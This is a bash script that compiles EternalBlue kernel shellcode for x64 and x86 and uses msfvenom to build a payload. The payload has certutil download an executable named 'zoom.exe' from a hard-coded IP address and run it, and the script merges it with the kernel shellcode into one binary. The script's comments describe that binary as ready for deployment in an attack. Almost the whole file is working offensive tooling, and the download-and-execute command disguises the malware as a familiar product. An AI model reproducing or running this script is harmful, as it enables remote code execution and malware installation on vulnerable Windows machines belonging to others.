#!/bin/bash
# This script compiles kernel shellcode for both x64 and x86 architectures, specifically tailored for the Eternal Blue exploit.
# It then generates a payload using msfvenom that utilizes certutil, a command-line utility that's part of Microsoft's
# Certificate Services, to download and execute the file "zoom.exe" from a specified URL. This technique is often used
# in penetration testing and by malicious actors to execute remote code on a vulnerable machine as part of the exploitation process.
# The script concludes by merging the compiled kernel shellcode with the generated payload into a single executable binary
# for each architecture, ready for deployment in an attack scenario exploiting the Eternal Blue vulnerability.


# Stop execution if any command returns a non-zero exit status.
set -e
cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
EOF
echo "Eternal Blue Windows Shellcode Compiler"
echo
echo "Let's compile them windoos shellcode"
echo
# Compile the x64 kernel shellcode using NASM (Netwide Assembler).
echo "Compiling x64 kernel shellcode"
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

# Compile the x86 kernel shellcode using NASM.
echo "'Compiling x86 kernel shellcode'"
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
echo "kernel shellcode compiled"

# Define the command for the payload: download and execute "zoom.exe" using certutil.
CMD="cmd /c certutil -urlcache -f http://3.21.21.191/zoom.exe %TEMP%\\zoom.exe & start %TEMP%\\zoom.exe"

# Use msfvenom to generate a payload based on the defined command.
# This payload is designed for x64 architecture.
echo "Generating payload to download and execute zoom.exe using certutil..."
msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o sc_x64_msf.bin EXITFUNC=thread

# Confirm payload generation.
echo "Payload for x64 generated."

# Begin merging the compiled kernel shellcode with the msfvenom-generated payload.
echo "MERGING KERNEL SHELLCODE WITH MSFVENOM-GENERATED PAYLOAD!"
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
# If there's an x86 version needed, follow similar steps to generate sc_x86_msf.bin and merge it.

# Confirm successful merge of shellcode and payload.
echo "Shellcode merged successfully."

echo "DONE"

# Exit the script.
exit 0
